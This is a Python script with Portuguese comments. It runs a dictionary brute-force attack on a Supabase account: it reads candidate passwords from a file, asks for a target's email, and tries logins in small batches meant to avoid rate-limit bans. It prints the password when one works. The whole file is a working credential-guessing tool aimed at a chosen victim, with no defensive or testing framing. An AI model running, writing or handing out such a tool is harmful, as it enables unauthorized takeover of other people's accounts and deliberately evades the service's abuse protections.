import asyncio
import time
from supabase import create_client, Client
from tqdm import tqdm

import os
from pathlib import Path
from dotenv import load_dotenv

env_path = Path(__file__).resolve().parent / ".env"
load_dotenv(env_path)

SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_PUBLISHABLE_KEY = os.getenv("SUPABASE_PUBLISHABLE_KEY")

# Inicialização do Cliente
supabase: Client = create_client(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY)

async def check_account(email, password):
    """Tenta realizar o login no Supabase"""
    try:
        # O método sign_in_with_password retorna os dados do usuário se for bem sucedido
        res = supabase.auth.sign_in_with_password({
            "email": email,
            "password": password
        })
        return True
    except Exception:
        return False

async def main():
    file_path = "senhas.txt"
    
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            # Assume que o arquivo está no formato email:senha ou apenas senhas
            # Se for apenas senhas, você precisará de um email fixo
            lines = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Erro: Arquivo {file_path} não encontrado.")
        return

    total_attempts = len(lines)
    found_password = None
    start_time = time.time()
    
    target_email = input("Digite o e-mail do alvo: ")

    print(f"Iniciando verificação de {total_attempts} senhas para {target_email}...")
    
    # tqdm cria a barra de progresso (1/300, 2/300...)
    with tqdm(total=total_attempts, unit="tentativa") as pbar:
        # Processamento em lotes para evitar banimento por rate limit do Supabase
        batch_size = 10 
        for i in range(0, total_attempts, batch_size):
            batch = lines[i : i + batch_size]
            tasks = [check_account(target_email, pwd) for pwd in batch]
            
            results = await asyncio.gather(*tasks)
            
            for idx, success in enumerate(results):
                if success:
                    found_password = batch[idx]
                    pbar.close()
                    break
                pbar.update(1)
            
            if found_password:
                break

    end_time = time.time()
    duration = end_time - start_time

    if found_password:
        # Painel Final solicitado
        banner = (
            "\n  ███████╗ ██████╗ ██╗   ██╗███╗   ██╗██████╗\n"
            "  ██╔════╝██╔═══██╗██║   ██║████╗  ██║██╔══██╗\n"
            "  █████╗  ██║   ██║██║   ██║██╔██╗ ██║██║  ██║\n"
            "  ██╔══╝  ██║   ██║██║   ██║██║╚██╗██║██║  ██║\n"
            "  ██║     ╚██████╔╝╚██████╔╝██║ ╚████║██████╔╝\n"
            "  ╚═╝      ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═════╝\n"
        )
        print(banner)
        print(f"Login aceito.")
        print(f"Senha correspondente: {found_password}")
        print(f"Tentativas: {pbar.n if 'pbar' in locals() else total_attempts}")
        print(f"Tempo: {duration:.2f} segundos")
        print(f"Tempo total: {duration:.2f} segundos")
    else:
        print("\nNenhuma senha correspondente encontrada.")

if __name__ == "__main__":
    asyncio.run(main())

